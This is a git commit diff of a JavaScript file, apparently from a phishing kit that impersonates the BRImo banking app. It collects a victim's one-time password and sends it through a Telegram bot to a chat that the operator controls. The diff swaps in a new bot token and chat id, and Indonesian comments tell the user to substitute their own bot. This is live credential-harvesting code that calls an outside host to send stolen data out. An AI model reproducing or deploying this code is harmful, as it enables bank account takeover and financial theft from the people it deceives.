b8267aa16a20e5c36fc5679a5cc9b0db8a6195dc
Abang11829 <abangikok1@gmail.com>
2025-05-18 08:11:50 +0700

    Update ver.js

--- ver.js
+++ ver.js
@@ -4,8 +4,8 @@ function kirimPesan1(event){
 
     var gabungan = `( BRImo | OTP )%0A%0A- Code OTP : ${nama1.value}`;
 
-var token = '7953552859:AAHPm-MnL8RRHeBJl_nmOyZAzDknYPB-ZVE'; // Ganti dengan token bot yang kamu buat
-    var grup = '6809554683'; // Ganti dengan chat id dari bot yang kamu buat    
+var token = '7268355250:AAHEEC0daFzQkyO3JvXqTb-MTQb9_oBSmuk'; // Ganti dengan token bot yang kamu buat
+    var grup = '7950730142'; // Ganti dengan chat id dari bot yang kamu buat    
 
     $.ajax({
         url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
